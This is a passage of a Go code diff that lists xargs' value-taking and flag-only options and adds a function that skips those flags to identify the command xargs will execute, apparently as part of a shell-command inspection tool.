+	"--no-run-if-empty": true, "--verbose": true, "--null": true, "--exit": true,
+}
+
+// xargsValFlags are xargs flags that consume the next argument as a value.
+//
+// Key-value flags (GNU + BSD/macOS):
+//
+//	-I, -J, -L, -n, -P, -R, -S, -s, -d, -E, -a
+//	--arg-file, --delimiter, --max-args, --max-procs, --max-lines, --replace
+var xargsValFlags = map[string]bool{
+	"-I": true, "-J": true, "-L": true, "-n": true, "-P": true,
+	"-R": true, "-S": true, "-s": true, "-d": true, "-E": true,
+	"-a": true,
+	"--arg-file": true, "--delimiter": true, "--max-args": true,
+	"--max-procs": true, "--max-lines": true, "--replace": true,
+}
+
+// xargsTargetCommand returns the command that xargs will execute, skipping over
+// xargs' own flags. Returns "" if no target command is found.
+func xargsTargetCommand(args []string) string {
+	for i := 0; i < len(args); i++ {
+		a := args[i]
+		if xargsNoValFlags[a] {
+			continue
+		}
+		if xargsValFlags[a] {
+			i++ // skip the value
+			continue
+		}
+		// Handle --flag=value syntax (e.g., --delimiter=,).
+		if strings.HasPrefix(a, "--") && strings.Contains(a, "=") {
+			continue
+		}
+		// Handle short flags with attached values (e.g., -I{}, -n1, -d,).
+		if len(a) > 2 && a[0] == '-' && a[1] != '-' {
+			short := a[:2]
+			if xargsValFlags[short] {
+				continue // value is attached
+			}
+		}
+		// Not a recognized xargs flag — this is the target command.
+		return a
+	}
+	return ""
 }
